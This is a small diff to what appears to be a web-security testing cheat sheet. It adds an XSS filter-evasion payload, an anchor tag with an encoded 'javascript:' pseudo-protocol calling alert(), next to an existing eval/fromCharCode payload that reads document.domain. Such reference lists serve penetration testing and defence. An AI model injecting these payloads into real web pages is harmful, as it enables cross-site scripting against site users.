@@ -2234,6 +2234,10 @@ Manually testing for XXE vulnerabilities generally involves
 - ```HTML
   <script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,100,111,109,97,105,110))</script>
   ```
+- ```HTML
+  <a href=jav%26%23x61%3bscript:alert()>
+  ```
+  - [source 1](https://twitter.com/TakSec/status/1649091314842238978), [source 2](https://brutelogic.com.br/blog/alternative-javascript-pseudo-protocol/)
 
 
 ### <ins>Cross-site request forgery (CSRF)</ins>
